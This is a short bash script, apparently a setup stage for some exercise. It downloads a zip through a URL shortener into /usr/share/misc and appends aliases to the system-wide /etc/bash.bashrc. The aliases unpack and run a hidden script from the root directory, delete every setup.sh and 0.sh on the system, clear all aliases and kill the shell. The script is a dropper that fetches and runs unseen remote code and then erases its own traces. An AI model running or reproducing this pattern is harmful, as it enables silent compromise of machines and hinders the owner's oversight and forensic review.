#!/bin/bash
mkdir /usr/share/misc/final
#wget https://raw.githubusercontent.com/D4NP0UL1N/Public/master/FINAL/setup.zip -O /usr/share/misc/final/setup.zip 
wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip
sleep 2
echo 'alias setup1="unzip /usr/share/misc/final/setup.zip -d /usr/share/misc/final/ >/dev/null 2>&1; mv 0.sh /; /0.sh; find / -name setup.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
echo 'alias setup2="rm /usr/share/misc/final/*.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
echo 'alias setup3="unalias -a"' >> /etc/bash.bashrc
echo 'alias clean="kill -9 $(echo $$)"' >> /etc/bash.bashrc
